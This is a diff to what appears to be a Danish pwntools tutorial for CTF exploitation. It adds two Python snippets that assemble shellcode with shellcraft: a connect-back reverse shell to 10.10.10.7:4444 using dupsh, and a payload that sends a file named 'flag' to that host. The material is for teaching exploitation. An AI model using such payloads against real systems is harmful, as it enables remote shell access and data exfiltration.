@@ -190,6 +190,18 @@ Args: [sock (imm/reg) = ebp]
 $
 ------------------------------------------------
 
+'connect' efterlader en socket i 'ebp'.
+
+'dupsh' tager en input file descriptor, men dens default værdi er 'ebp'.
+
+Standard single stage shellcodes - connect + dupsh
+--------------------------------------------------
+[source,python]
+------------------------------------------------
+SHELLCODE = asm(shellcraft.connect('10.10.10.7', 4444) + \
+                shellcraft.dupsh())
+------------------------------------------------
+
 Standard single stage shellcodes - connect + readfile
 -----------------------------------------------------
 [source,bash]
@@ -206,4 +218,16 @@ $ shellcraft i386.linux.readfile -?
 Args: [path, dst (imm/reg) = esi ]
     Opens the specified file path and sends its content to the specified file descriptor.
 $
+------------------------------------------------
+
+'connect' efterlader en socket i 'ebp'.
+
+'readfile' tager en filedescriptor, men dens default værdi er 'esi'.
+
+Standard single stage shellcodes - connect + readfile
+-----------------------------------------------------
+[source,python]
+------------------------------------------------
+SHELLCODE = asm(shellcraft.connect('10.10.10.7', 4444) + \
+                shellcraft.readfile('flag', 'ebp'))
 ------------------------------------------------
